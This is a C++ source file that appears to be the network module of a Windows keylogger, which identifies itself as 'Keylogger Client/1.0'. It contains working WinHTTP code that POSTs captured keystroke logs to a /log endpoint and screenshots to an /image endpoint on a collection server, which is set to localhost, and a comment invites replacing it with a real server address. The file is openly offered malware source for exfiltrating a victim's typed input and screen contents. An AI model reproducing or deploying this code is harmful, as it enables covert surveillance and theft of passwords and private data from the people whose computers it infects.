#include <mutex>
#include "../include/post_request.h"
#include <string>
#include <windows.h>
#include <winhttp.h>

bool send_via_post(const std::vector<char>& logs) {
    HINTERNET hSession = WinHttpOpen(
        L"Keylogger Client/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );

    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        L"localhost", // Replace with server IP/hostname
        5000,         // Server port
        0
    );

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/log",    // Server endpoint
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::string log_data(logs.begin(), logs.end());
    bool success = false;

    if (WinHttpSendRequest(
        hRequest,
        L"Content-Type: text/plain\r\n",
        (DWORD)-1L,
        (LPVOID)log_data.data(),
        (DWORD)log_data.size(),
        (DWORD)log_data.size(),
        0
    )) {
        WinHttpReceiveResponse(hRequest, NULL);

        DWORD status_code = 0;
        DWORD size = sizeof(status_code);
        WinHttpQueryHeaders(
            hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL,
            &status_code,
            &size,
            NULL
        );

        if (status_code == 200) success = true;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

bool send_screenshot(const std::vector<char>& bmpData) {
    HINTERNET hSession = WinHttpOpen(
        L"Keylogger Client/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSession)
        return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", 5000, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/image",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool success = false;
    LPCWSTR headers = L"Content-Type: image/bmp\r\n";
    DWORD dataSize = bmpData.size();

    if (WinHttpSendRequest(
            hRequest,
            headers,
            (DWORD)-1L,
            (LPVOID)bmpData.data(),
            dataSize,
            dataSize,
            0
        )) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD status_code = 0;
            DWORD size = sizeof(status_code);
            if (WinHttpQueryHeaders(
                    hRequest,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    NULL,
                    &status_code,
                    &size,
                    NULL)) {
                if (status_code == 200)
                    success = true;
                    }
            }
        }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}